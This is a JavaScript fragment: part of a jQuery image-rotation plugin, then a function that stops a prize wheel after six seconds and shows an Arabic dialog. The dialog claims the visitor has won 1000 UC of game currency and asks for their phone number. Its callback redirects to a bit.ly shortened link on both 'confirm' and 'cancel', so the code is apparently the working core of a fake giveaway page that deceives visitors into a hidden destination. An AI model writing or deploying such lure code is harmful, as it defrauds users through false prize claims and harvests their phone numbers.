  ...
  Wilq32.PhotoEffect.prototype = {
    _setupParameters: function(parameters) {
      ...
      this._parameters.easing =
        parameters.easing || this._parameters.easing || this._defaultEasing;
      this._parameters.duration =
        "duration" in parameters
          ? parameters.duration
          : parameters.duration || this._parameters.duration || 1000;
      this._parameters.callback =
        parameters.callback || this._parameters.callback || this._emptyFunction;
      ...
      if (IE)
        ...
        return function() {
          ...
          var _widthMax = Math.sqrt(
            this._imgHeight * this._imgHeight + this._imgWidth * this._imgWidth
          );
...
function xZold() {
  ...
  setTimeout(function() {
    $(".wheel").stopRotate();
    bootbox.confirm({
      title: "لقد حصلت على 1000 يو سي",
      message: "برجاء تسجيل رقمك للحصول على الهدية",
      buttons: {
        cancel: {
          label: "الغاء"
        },
        confirm: {
          label: "سجل رقمك الان واحصل على الجائزه"
        }
      },
      callback: function(result) {
        window.location = "https://bit.ly/2xalbKc";
      }
    });
  }, 6000);
